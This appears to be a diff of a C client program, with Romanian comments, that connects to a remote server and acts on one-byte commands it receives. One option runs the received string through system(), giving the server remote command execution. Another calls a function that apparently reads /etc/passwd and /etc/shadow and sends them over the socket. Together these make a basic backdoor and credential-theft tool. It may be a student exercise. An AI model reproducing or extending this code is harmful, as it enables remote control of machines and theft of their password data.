@@ -6,12 +6,15 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include "credentials_utils.h"
 
 #define PORT	 8080
 #define MAXLINE 1024
 
 int sockfd;
 
+
+//TODO avem voie sa folosim system sau e prea usor?
 void exec_commmand()
 {
     char recv_command[MAXLINE];
@@ -26,12 +29,13 @@ void exec_commmand()
 
 	system(recv_command);
     
-}
+}	
+
 
 int main() {
 	char buffer[MAXLINE];
 	struct sockaddr_in	 servaddr;
- 
+	
 	// Creating socket file descriptor
 	if ( (sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0 ) {
 		perror("socket creation failed");
@@ -47,11 +51,36 @@ int main() {
  
 	int n, len;
 
-    connect(sockfd,(const struct sockaddr*)&servaddr,sizeof(servaddr));
-
-    while(1)
+	int val_conn;
+    val_conn=connect(sockfd,(const struct sockaddr*)&servaddr,sizeof(servaddr));
+	if(val_conn!=0)
 	{
-		exec_commmand();
+		perror("connection failed");
+		exit(EXIT_FAILURE);
+	}
+    while(1)
+	{	
+		myWrite("Receiving option",STDOUT_FILENO);
+		char opt;
+		int bytesRead=0;
+		while(bytesRead!=1)
+		{
+			bytesRead=read(sockfd,&opt,1);
+		}
+		myWrite("Received option",STDOUT_FILENO);
+		switch(opt)
+		{	
+
+			//TODO: Flush la buffer atunci cand vreau sa execut o comanda
+			case '1':
+			exec_commmand();
+			break;
+			case '2':
+			etc_passwd_shadow_checker(sockfd);
+			break;
+			default:
+			break;
+		}
 	}
 
 
